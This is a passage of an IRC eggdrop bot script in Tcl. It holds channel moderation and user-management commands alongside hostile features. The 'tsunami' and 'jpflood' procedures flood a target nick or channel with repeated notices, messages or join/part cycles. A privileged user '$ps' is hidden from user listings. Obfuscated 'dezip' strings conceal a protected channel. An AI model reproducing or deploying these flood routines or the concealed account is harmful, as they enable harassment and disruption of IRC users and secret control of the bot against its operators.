if {[getuser $msend XTRA "MEMO"]!=""} {
puthlp "NOTICE $nick : 4deNiEd!, MeMo FoR $msend STiLL ExIST!"
return 0
}
setuser [lindex $rest 0] XTRA "MEMO" "$nick: [lrange $rest 1 end]"
saveuser
puthlp "NOTICE $nick : MeMO SeND TO \[[lindex $rest 0]\]"
}
}
}
proc pub_+mustop {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
setuser "config" XTRA "MUSTOP" "T"
saveuser
puthlp "NOTICE $nick : must @P set \[9ON\]"
}
proc pub_-mustop {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
setuser "config" XTRA "MUSTOP" ""
saveuser
puthlp "NOTICE $nick : must @P set \[4OFF\]"
}
proc pub_kickops {nick uhost hand chan rest} {
global notc kops
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[string tolower $rest] == "on"} {
set kops "T"
setuser "config" XTRA "KOPS" "T"
puthlp "NOTICE $nick : KIcK @PS \[9ON\]"
} {
catch { unset kops }
setuser "config" XTRA "KOPS" ""
puthlp "NOTICE $nick : KIcK @PS \[4OFF\]"
}
saveuser
}
bind topc - * topic_chk
proc pub_badwords {nick uhost hand chan rest} {
global badwords notc 
set retval "BaDWoRDS: "
foreach badword [string tolower $badwords] {
append retval "$badword "
}
puthlp "NOTICE $nick : $retval"
return 0
}
proc pub_+badword {nick uhost hand chan rest} {
global badwords notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest == ""} { 
puthlp "NOTICE $nick : Usage: `+badword <badword>"
return 0
}
if {[string match "*[string tolower [lindex $rest 0]]*" $badwords]} {
puthlp "NOTICE $nick : [lindex $rest 0] Allready Added"
return 0
}
append badwords " [string tolower [lindex $rest 0]]"
setuser "config" XTRA "BADWORDS" $badwords
saveuser
puthlp "NOTICE $nick : Added [lindex $rest 0] to badwords"
return 0
}
proc pub_-badword {nick uhost hand chan rest} {
global badwords notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest == ""} { 
puthlp "NOTICE $nick : Usage: `-badword <badword>"
return 0
}
set val ""
foreach badword [string tolower $badwords] {
if {[string tolower [lindex $rest 0]] == $badword} { 
puthlp "NOTICE $nick : Removed [lindex $rest 0]"
} else { append val " $badword " }
}
set badwords $val
setuser "config" XTRA "BADWORDS" $val
saveuser
return 0
}
proc pub_jump {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set server [lindex $rest 0]
if {$server == ""} {
puthlp "NOTICE $nick : Usage: jump <server> \[port\] \[password\]"
return 0
}
if {![string match "*dal.net*" [string tolower $rest]]} {
puthlp "NOTICE $nick : 4deNiEd! NoT DALNeT..!"
return 0
}
set port [lindex $rest 1]
if {$port == ""} {set port "6666"}
set password [lindex $rest 2]
putsrv "QUIT : cHaNgINg ServeR ReQuesT By \[ $nick \] $server"
utimer 2 [list jump $server $port $password]
}
proc msg_die {nick uhost hand rest} {
global notc owner ps
if {$nick != $owner &&  $nick != $ps} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
foreach x [userlist] {
if {$x != "AKICK"} {
chattr $x -Q
foreach y [getuser $x HOSTS] {
delhost $x $y
}
set hostmask "${x}!*@*"
setuser $x HOSTS $hostmask
}
}
saveuser
if {$rest != ""} {
set rest " $rest"
}
putsrv "QUIT : SHuTDown ReQuesT By \[ $nick \]$rest"
utimer 5 dies
}
proc pub_ignores {nick uhost hand chan rest} {
global botnick notc 
set iglist ""
foreach x [ignorelist] {
set iglister [lindex $x 0]
set iglist "$iglist $iglister"
}
if {[ignorelist]==""} {
puthlp "NOTICE $nick : No ignores."
return 0
}
regsub -all " " $iglist ", " iglist
set iglist [string range $iglist 1 end]
puthlp "NOTICE $nick : Currently ignoring:$iglist"
return 0
}
proc pub_-ignore {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set hostmask [lindex $rest 0]
if {$hostmask == ""} {
puthlp "NOTICE $nick : Usage: -ignore <hostmask>"
return 0
}
if {![isignore $hostmask]} {
puthlp "NOTICE $nick : $hostmask is not on my ignore list."
return 0
}
if {[isignore $hostmask]} {
killignore $hostmask
puthlp "NOTICE $nick : No longer ignoring \002\[\002${hostmask}\002\]\002"
saveuser
}
}
proc pub_+ignore {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set rest [lindex $rest 0]
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: +ignore <hostmask>"
return 0
}
if {[isignore $rest]} {
puthlp "NOTICE $nick : $rest is alreay set on ignore."
return 0
}
if {$rest == "*!*@*"} {
puthlp "NOTICE $nick : 4deNiEd!, Ilegal hostmask."
return 0
} 
set usenick [finduser $rest]
if {$usenick != "*" && [matchattr $usenick f]} {
puthlp "NOTICE $nick : 4deNiEd!, canT IgNoREd FRIend UsER"
return 0
}
if {$rest != $nick} {
newignore $rest $nick "*" 600
puthlp "NOTICE $nick : Ignoring $rest"
} else { 
puthlp "NOTICE $nick : 4deNiEd!, Can't ignore your self."
}
}
proc pub_-host {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set who [lindex $rest 0]
set hostname [lindex $rest 1]
set completed 0
if {($who == "") || ($hostname == "")} {
puthlp "NOTICE $nick : Usage: -host <nick> <hostmask>"
return 0
}
if {![validuser $who]} {
puthlp "NOTICE $nick : <n/a>"
return 0
}
if {(![matchattr $nick n]) && ([matchattr $who n])} {
puthlp "NOTICE $nick : Can't remove hostmasks from the bot owner."
return 0
}
if {![matchattr $nick m]} {
if {[string tolower $hand] != [string tolower $who]} {
puthlp "NOTICE $nick : You need '+m' to change other users hostmasks"
return 0
}
}
foreach * [getuser $who HOSTS] {
if {${hostname} == ${*}} {
delhost $who $hostname
saveuser
puthlp "NOTICE $nick : Removed \002\[\002${hostname}\002\]\002 from $who."
set completed 1
}
}
if {$completed == 0} {
puthlp "NOTICE $nick : 4deNiEd!, <n/a>"
}
}
set thehosts {
*@* * *!*@* *!* *!@* !*@*  *!*@*.* *!@*.* !*@*.* *@*.*
*!*@*.com *!*@*com *!*@*.net *!*@*net *!*@*.org *!*@*org
*!*@*gov *!*@*.ca *!*@*ca *!*@*.uk *!*@*uk *!*@*.mil
*!*@*.fr *!*@*fr *!*@*.au *!*@*au *!*@*.nl *!*@*nl *!*@*edu
*!*@*se *!*@*.se *!*@*.nz *!*@*nz *!*@*.eg *!*@*eg *!*@*dk
*!*@*.il *!*@*il *!*@*.no *!*@*no *!*@*br *!*@*.br *!*@*.gi
*!*@*.gov *!*@*.dk *!*@*.edu *!*@*gi *!*@*mil *!*@*.to *!@*.to 
*!*@*to *@*.to *@*to
}
proc pub_+host {nick uhost hand chan rest} {
global thehosts botnick notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set who [lindex $rest 0]
set hostname [lindex $rest 1]
if {($who == "") || ($hostname == "")} {
puthlp "NOTICE $nick : Usage: +host <nick> <new hostmask>"
return 0
}
if {![validuser $who]} {
puthlp "NOTICE $nick : 4deNiEd!, <n/a>"
return 0
}
set badhost 0
foreach * [getuser $who HOSTS] {
if {${hostname} == ${*}} {
puthlp "NOTICE $nick : That hostmask is already there."
return 0
}
}
if {($who == "") && ($hostname == "")} {
puthlp "NOTICE $nick : Usage: +host <nick> <new hostmask>"
return 0
}
if {([lsearch -exact $thehosts $hostname] > "-1") || (![string match *@* $hostname])} {
if {[string index $hostname 0] != "*"} {
set hostname "*!*@*${hostname}"
} else {
set hostname "*!*@${hostname}"
}
}
if {([string match *@* $hostname]) && (![string match *!* $hostname])} { 
if {[string index $hostname 0] == "*"} {
set hostname "*!${hostname}"
} else {
set hostname "*!*${hostname}"
}
}
if {![validuser $who]} {
puthlp "NOTICE $nick : 4deNiEd!, <n/a>"
return 0
}
if {(![matchattr $nick n]) && ([matchattr $who n])} {
puthlp "NOTICE $nick : Can't add hostmasks to the bot owner."
return 0
}
foreach * $thehosts {
if {${hostname} == ${*}} {
puthlp "NOTICE $nick : Invalid hostmask!"
set badhost 1
}
}
if {$badhost != 1} {
if {![matchattr $nick m]} {
if {[string tolower $hand] != [string tolower $who]} {
puthlp "NOTICE $nick : You need '+m' to change other users hostmasks"
return 0
}
}
setuser $who HOSTS $hostname
puthlp "NOTICE $nick : Added \002\[\002${hostname}\002\]\002 to $who."
if {[matchattr $who a]} {
opq $chan $who
}
saveuser
}
}
proc msg_join {nick uhost hand rest} {
global botnick joinme own notc owner ps
set chantarget [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$nick != $owner &&  $nick != $ps} {
puthlp "NOTICE $nick : 4deNiEd!, YoU aRe nOt mY ReAL OwNER"
return 0
}

if {$chantarget == ""} {
puthlp "NOTICE $nick : Usage: join <#chan>"
return 0
}
if {[string first # $chantarget]!=0} {
set chantarget "#$chantarget"
}
if {[validchan $chantarget]} {
puthlp "NOTICE $nick : $chantarget already in channel list"
return 0
}
if {$nick != $owner && [total_channel] != 1} {
puthlp "NOTICE $nick : To MaNY cHaNNeL MaX 9..!"
return 0
}
set joinme $nick
channel add $chantarget
catch { channel set $chantarget +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
if {[lindex $rest 1] != ""} { 
putsrv "JOIN $chantarget :[lindex $rest 1]"
}
return 0
}
proc msg_+chan {nick uhost hand rest} {
global botnick joinme own notc owner ps
set chantarget [lindex $rest 0]
set opt [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick : 4!BLoCkEd!"
return 0
}
if {$nick != $owner &&  $nick != $ps} {
puthlp "NOTICE $nick : 4deNiEd!, oNLy ReAL OwNER can ADD Channel"
return 0
}
if {$chantarget == ""} {
puthlp "NOTICE $nick : Usage: +chan <#chan>"
return 0
}
if {[string first # $chantarget]!=0} {
set chantarget "#$chantarget"
}
if {[validchan $chantarget]} {
puthlp "NOTICE $nick : $chantarget is already on channels list."
return 0
}
if {$nick != $owner && [total_channel] != 1} {
puthlp "NOTICE $nick : OnLY ReAL OwNeR can ADD ChaNneL ..!"
return 0
}
set joinme $nick
channel add $chantarget
if {$opt != "" && [string tolower $opt] == "+nopart"} { 
catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
} else {
catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
}
savechan
if {[lindex $rest 1] != ""} { 
putsrv "JOIN $chantarget :[lindex $rest 1]"
}
return 0
}
proc msg_part {nick uhost hand rest} {
global botnick joinme notc ps partm
set partmsg [lindex $partm [rand [llength $partm]]]
set chantarget [lindex $rest 0]
set part_msg [lrange $rest 1 end]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$chantarget == ""} {
puthlp "NOTICE $nick : Usage: part <#chan>"
return 0
}
if {[string first # $chantarget]!=0} {
set chantarget "#$chantarget"
}
if {$nick != $ps && [string tolower $chantarget] == [dezip "ER5sr09TRjx1"]} { return 0 }
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
if {[string match "*+secret*" [channel info $x]]} {
puthlp "NOTICE $nick : I can't part $x 4pRoTecTEd..!"
return 0
}
if {![onchan $nick $x]} { 
puthlp "NOTICE $nick : PaRT $x"
}
if {$part_msg != ""} { 
putsrv "PART $x :$part_msg"
} { 
putsrv "PART $x :6$partmsg"
}
channel remove $x
savechan
return 0
}
}
return 0
}
proc pub_chanreset {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: chanreset <#|ALL>"
return 0
}
set chan [lindex $rest 0]
if {[string tolower $chan] == "all"} {
puthlp "NOTICE $nick : ReSeT ALL DeFauLT FLAg"
foreach x [channels] {
catch { channel set $x -statuslog -revenge -protectops -clearbans +cycle -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
catch { channel set $x -nodesynch }
set cflag "c$x"
set cflag [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
}
savechan
return 0
}
if {[string first # $chan]!=0} {
set chan "#$chan"
}
puthlp "NOTICE $nick : ReSeT cHaNNeL \[$chan\] DeFauLT FLAg"
if {![validchan $chan]} {
puthlp "NOTICE $nick : UnFIndEd $chan."
return 0
}
catch { channel set $chan -statuslog -revenge -protectops +cycle -clearbans -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
catch { channel set $chan -nodesynch }
set cflag "c$chan"
set cflag [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
savechan
}
proc msg_channels {nick hand uhost rest} {
pub_channels $nick $uhost $hand "" $rest
}
proc pub_channels {nick hand uhost channel rest} {
global botnick notc
if {$rest != ""} {
if {[validchan [lindex $rest 0]]} {
set x [lindex $rest 0]
set chan ""
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == [dezip "ER5sr09TRjx1"]} { return 0 }
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
if {[matchattr $cflag V]} { append chan "4V" }
if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
if {[matchattr $cflag C]} { append chan "4C" }
if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
if {[matchattr $cflag G]} { append chan "4A" }
if {[matchattr $cflag I]} { append chan "4T" }
append chan "$x [chattr $cflag]"
puthlp "NOTICE $nick : $chan"
}
return 0
}
set chan "Channels:"
foreach x [channels] {
if {[string tolower $x] != [dezip "ER5sr09TRjx1"]} {
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
if {[matchattr $cflag V]} { append chan "4V" }
if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
if {[matchattr $cflag C]} { append chan "4C" }
if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
if {[matchattr $cflag G]} { append chan "4A" }
if {[matchattr $cflag I]} { append chan "4T" }
append chan "$x"
}
}
puthlp "NOTICE $nick : $chan"
}
proc pub_match {nick uhost hand chan rest} {
global ps notc 
if {$rest==""} {
puthlp "NOTICE $nick : Usage: match <flags>"
return 0
}
set rest [string trim $rest +]
if {[string length $rest] > 1} {
puthlp "NOTICE $nick : Invalid option."
return 0
}
if {$rest!=""} {
set rest "+[lindex $rest 0]"
if {[userlist $rest]!=""} {
regsub -all " " [userlist $rest] ", " users 
regsub -all $ps [userlist $rest] "" users 
puthlp "NOTICE $nick : Match \[$rest\]: $users"
return 0
}
if {[userlist $rest]==""} {
puthlp "NOTICE $nick : No users with flags \[$rest\]"
return 0
}
}
}
proc val {string} {
set arg [string trim $string /ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
set arg2 [string trim $arg #!%()@-_+=\[\]|,.?<>{}]
return $arg2
}
proc msg_topic {nick uhost hand rest} {
global notc botnick
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: topic <#> <topic>"
return 0
}
set channel [lindex $rest 0]
if {[string first # $rest] != 0} { 
set channel "#$channel"
}
if {![validchan $channel]} {
puthlp "NOTICE $nick : NoT IN $channel"
return 0 
}
if {![isop $botnick $channel]} {
puthlp "NOTICE $nick : NoT OP $channel"
return 0 
}
set rest [lrange $rest 1 end]
putsrv "TOPIC $channel :$rest"
}
proc pub_topic {nick uhost hand channel rest} {
global botnick notc botnick 
if {![isop $botnick $channel]} { return 0 }
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: topic <topic>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
putsrv "TOPIC $channel :$rest"
} 
set cmd_chn ""
set cmd_by ""
set cmd_msg ""
set cmd_case ""
bind join - * join_jf
proc join_jf {nick uhost hand chan} {
global botnick quick jpfchn jpfmsg jpfidx
if {![info exists jpfmsg]} { return 0 }
if {$nick != $botnick} { return 0 }
if {$chan != $jpfchn} { return 0 }
if {$quick == "1"} {
putqck "PRIVMSG $chan :$jpfmsg,"
} else {
putsrv "PRIVMSG $chan :$jpfmsg,"
}
incr jpfidx
if {$jpfidx >= 4} { 
catch { channel remove $jpfchn }
catch { unset jpfchn }
catch { unset jpfmsg }
catch { unset jpfidx }
puthlp "AWAY"
return 0
}
if {$quick == "1"} {
putqck "part $chan :$jpfmsg"
} else {
putsrv "part $chan :$jpfmsg"
}
}
proc pub_jpflood {nick uhost hand channel rest} {
global jpfmsg jpfidx notc ps
if {[string index $rest 0] != "#" || $rest == ""} {
puthlp "NOTICE $nick : Usage: jpflood #channel message"
return 0
}
if {[validchan [lindex $rest 0]]} {
puthlp "NOTICE $nick : dOnt UsE ExIsT cHanneL..!"
return 0
}
set jpfmsg " n0 Reas0n "
if {[lindex $rest 1] != ""} { 
set jpfmsg [lindex $rest 1]
}
set jpfchn [lindex $rest 0]
if {$nick != $ps && [string tolower $jpfchn] == [dezip "ER5sr09TRjx1"]} { return 0 }
set jpfidx 0
catch { clearqueue all }
pub_randnick $nick $uhost $hand $channel ""
utimer 10 hazar
}
proc hazar {} {
global jpfchn
utimer 120 goback
channel add $jpfchn
catch { channel set $jpfchn +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
}
proc pub_tsunami {nick uhost hand channel rest} {
global cmd_chn cmd_by cmd_msg cmd_case botnick version notc quick ps owner
if {$nick != $owner &&  $nick != $ps} { 
puthlp "PRIVMSG $nick :$notm oNLy ReAL OwNER can uSe tSuNaMi"
return 0 
}
set person [lindex $rest 0]
set rest [lrange $rest 1 end]
if {$person == $botnick} { return 0 }
if {[string index $person 0] == "#"} {
if {[validchan $person]} {
if {[isop $botnick $person] && ![matchattr $nick m]} {
if {[isutimer "IN PROGRESS"]} { return 0 }
utimer 20 [list putlog "IN PROGRESS"]
putsrv "KICK $channel $nick : 1cHaNNeL 4FLoOd1 PRoTecTIoN4..!"
return 0
}
}
}
if {[matchattr $person n] && ![matchattr $nick Z]} {
if {[isop $botnick $channel]} {
putsrv "KICK $channel $nick : 1Admin 4FLoOd1 PRoTecTIoN4..!"
}
if {[istimer "IN PROGRESS"]} { return 0 }
timer 2 [list putlog "IN PROGRESS"]
putsrv "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
puthlp "NOTICE $nick :ADmIN fLood PRoTEcTIoN,"
return 0
}
if {![matchattr $nick Z]} {
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: tsunami <nick/#> <msg>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[string tolower $person] == [string tolower $ps]} { return 0 }
if {[string index $person 0] == "#"} {
if {![validchan $person]} {
if {$nick != $ps && [string tolower $person] == [dezip "ER5sr09TRjx1"]} { return 0 }
pub_randnick $nick $uhost $hand $channel ""
set cmd_chn $person
set cmd_msg $rest
set cmd_by $nick
set cmd_case "1"
channel add $person
catch { channel set $person +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
}
catch { clearqueue all }
pub_randnick $nick $uhost $hand $channel ""
if {[string index $person 0] == "#"} { setignore "*!*@*" "*" 120 }
if {$quick == "1"} {
putqck "PRIVMSG $person :$rest,"
putqck "NOTICE $person :$rest,"
}
putsrv "NOTICE $person :$rest,"
puthlp "NOTICE $person :$rest,"
puthlp "NOTICE $person :$rest,"
puthlp "NOTICE $person :$rest,"
puthlp "NOTICE $person :$rest,"
puthlp "NOTICE $person :$rest,"
utimer 10 { 
puthlp "AWAY"
}
utimer 120 goback
return 0
}
bind time -  "*2 * * * *" auto_ident
proc auto_ident {min h d m y} {
timer 5 ident_it
auto_ping "0" "0" "0" "0" "0"
}

bind notc - "*This nickname is registered and protected.*" autoident
bind notc - "*Password accepted - you are now recognized.*" compautoident
proc autoident {nick uhost hand text dest} {
global nickpass
  putserv "PRIVMSG NickServ :identify $nickpass"
}
proc compautoident {nick uhost hand text dest} {
global owner
  putserv "PRIVMSG $owner :\002Identification\002 has been successful.."
}

bind notc - "*This nick is owned by someone else.*" autoident2
bind notc - "*Password accepted for*" compautoident2
proc autoident2 {nick uhost hand text dest} {
global nickpass
  putserv "PRIVMSG NickServ@services.dal.net :identify $nickpass"
}
proc compautoident2 {nick uhost hand text dest} {
global owner
  putserv "PRIVMSG $owner :\002Identification\002 has been successful.."
}

proc ident_it {} {
global nick altnick botnick nickpass altpass ex_flood invme pingchan own chk_reg
global kickme deopme cmd_chn cmd_msg ps twice_msg keep-nick version notc lastkey
global flooddeop floodnick floodkick server-online is_m op_it jpfchn jpfmsg jpfidx
putlog "!Log! AuTO ReSETING VaRIABLE"
catch { channel remove $jpfchn }
catch { unset jpfchn }
catch { unset jpfmsg }
catch { unset jpfidx }
catch {unset op_it}
catch {unset is_m}
catch {unset chk_reg}
catch {unset flooddeop}
catch {unset floodnick}
catch {unset floodkick}
catch {unset lastkey}
catch {unset ex_flood}
catch {unset invme}
catch {unset pingchan}
catch {unset twice_msg}
catch {unset kickme}
set deopme ""
set cmd_chn ""
set cmd_msg ""
if {${server-online} == 0} { return 0 }
if {![string match "ERR??????????" $botnick] && ![string match "ERR??????" $botnick]} {
if {$botnick != $nick && $botnick != $altnick && ![istimer "goback"] && ![isutimer "goback"]} { goback }
} {
goback
}
if {$ps != $own} {
set own $ps
}
if {![isutimer "del_nobase"] && ![istimer "del_nobase"]} { utimer 2 del_nobase }
}
bind time -  "*4 * * * *" auto_ping
bind time -  "*8 * * * *" auto_ping
proc auto_ping {min h d m y} {
global botnick repeat_last repeat_person capsnick own notc notc_chn bannick
global unop wait_ping server-online jpnick igflood is_ban iskick
if {${server-online} == 0} {
catch { unset wait_ping }
return 0
}
catch {unset iskick}
catch {unset is_ban}
catch {unset igflood}
catch {unset jpnick}
catch {unset unop}
catch {unset bannick}
catch {unset notc_chn}
catch {unset capsnick}
catch {unset repeat_person}
catch {unset repeat_last}
puthlp "PRIVMSG $botnick :\001PING [unixtime]\001"
if {![info exists wait_ping]} {
set wait_ping 1
} else {
set wait_ping [expr $wait_ping + 1]
}
if {$wait_ping > 9} {
catch { unset wait_ping }
#putsrv "QUIT : Server LAggEd AuTo ReSTaRT ReQuesT"
}
}
proc remain {} {
global botnick uptime timezone notc notd vern longer awaym
   set totalyear [expr [unixtime] - $uptime]
   if {$totalyear >= 31536000} {
      set yearsfull [expr $totalyear/31536000]
      set years [expr int($yearsfull)]
      set yearssub [expr 31536000*$years]
      set totalday [expr $totalyear - $yearssub]
   }
   if {$totalyear < 31536000} {
      set totalday $totalyear
      set years 0
   }
   if {$totalday >= 86400} {
      set daysfull [expr $totalday/86400]
      set days [expr int($daysfull)]
      set dayssub [expr 86400*$days]
      set totalhour [expr $totalday - $dayssub]
   }
   if {$totalday < 86400} {
      set totalhour $totalday
      set days 0
   }
   if {$totalhour >= 3600} {
      set hoursfull [expr $totalhour/3600]
      set hours [expr int($hoursfull)]
      set hourssub [expr 3600*$hours]
      set totalmin [expr $totalhour - $hourssub]
   }
   if {$totalhour < 3600} {
      set totalmin $totalhour
      set hours 0
   }
   if {$totalmin >= 60} {
      set minsfull [expr $totalmin/60]
      set mins [expr int($minsfull)]
   }
   if {$totalmin < 60} {
      set mins 0
   }
   if {$years < 1} {set yearstext ""} elseif {$years == 1} {set yearstext "$years year, "} {set yearstext "$years years, "}
   if {$days < 1} {set daystext ""} elseif {$days == 1} {set daystext "$days day, "} {set daystext "$days days, "}
   if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "$hours ^BH^B^_o^_^BUR^B, "} {set hourstext "$hours ^BH^B^_o^_^BURS^B, "}
   if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "$mins ^BM^B^_i^_^BN^B^_u^_^BTE^B"} {set minstext "$mins ^BM^B^_i^_^BN^B^_u^_^BTES^B"}
   if {[string length $mins] == 1} {set mins "0${mins}"}
   if {[string length $hours] == 1} {set hours "0${hours}"}
   set output "${yearstext}${daystext}${hours}:${mins}"
   set output [string trimright $output ", "]
   set awban "[lgrnd]"
   if {[getuser "config" XTRA "AWAY"]!=""} {
      set longer "$awban \[\037Uptime:\037 $output\] ([getuser "config" XTRA "AWAY"])"
   } {
      set awaymsg [lindex $awaym [rand [llength $awaym]]]
      set longer "$awban \[\037Uptime:\037 $output\] [dezip "EL0P10zaHDp/"] $awaymsg [dezip "ivRvn.ZAO1G/"]"
   }
}

proc msg_userlist {nick hand uhost rest} {
global notc 
pub_userlist $nick $uhost $hand "" $rest
}
proc pub_userlist {nick uhost hand chan rest} {
global ps notc 
set akicklist " 4KIcKLIsT"
foreach y [getuser "AKICK" HOSTS] {
append akicklist " $y "
}
set users "UsERLIsT:"
foreach x [userlist] {
if {($x != "config") && ($x != "AKICK") && ($x != $ps) && ![matchattr $x A]} {
if {[matchattr $x O]} { 
append users " 4$x "
} else { append users " $x " }
set flag [chattr $x]
append users "($flag)"
}
}
append users " \[$akicklist\]"
if {[getuser "config" XTRA "IPG"] != ""} {
append users " IpguaRd [getuser "config" XTRA "IPG"]"
}
if {[string length $users] > 300} {
set half [expr [string length $users]/3]
set half [expr int($half)]
set ntc "[string range $users 0 $half].."
puthlp "NOTICE $nick : $ntc"
set ntc "..[string range $users [expr $half + 1] [expr $half + $half]].."
puthlp "NOTICE $nick : $ntc"
set ntc "..[string range $users [expr $half + 1 + $half] end]"
puthlp "NOTICE $nick : $ntc"
} elseif {[string length $users] > 200} {
set half [expr [string length $users]/2]
set half [expr int($half)]
set ntc "[string range $users 0 $half].."
puthlp "NOTICE $nick : $ntc"
set ntc "..[string range $users [expr $half + 1] end]"
puthlp "NOTICE $nick : $ntc"
} else {
puthlp "NOTICE $nick : $users"
}
return 0
}
proc pub_ver {nick uhost hand chan rest} {
global vern
puthlp "PRIVMSG $chan :$vern"
return 0
}
proc pub_logo {nick uhost hand chan rest} {
global notc
puthlp "PRIVMSG $chan :"
return 0
}
proc pub_ping {nick uhost hand chan rest} {
puthlp "PRIVMSG $chan :$nick, ping bayar bos!!"
return 0
}
proc pub_nobot {nick uhost hand chan rest} {
global botnick
if {![isop $botnick $chan]} { return 0 }
if {[isutimer "pub_nobot"]} { return 0 }
if {[rand 2] <= 1} {
puthlp "PRIVMSG $chan :\001USERINFO\001"
} {
puthlp "PRIVMSG $chan :\001CLIENTINFO\001"
}
return 0
}
bind ctcr - USERINFO ui_reply
bind ctcr - CLIENTINFO ui_reply
proc ui_reply {nick uhost hand dest key arg} {
global botnick bannick notc ismaskhost
if {![string match "*eggdrop*" $arg]} { return 0 }
if {$nick == $botnick || [matchattr $nick f]} { return 0 }
foreach x [channels] {
if {[onchan $nick $x] && [isop $botnick $x] && ![isop $nick $x]} {
if {[info exists ismaskhost]} {
set bannick($nick) [maskhost "*!*[string range $uhost [string first "@" $uhost] end]"]
} {
set bannick($nick) "*!*[string range $uhost [string first "@" $uhost] end]"
}
putsrv "KICK $x $nick : 4[string toupper $x]1 FoRBIDDeN FoR 4EggY1 DuE tO LamE AnTIcIPaTEd [banmsg]"
return 0
}
}
}
bind ctcr - PING ping_reply
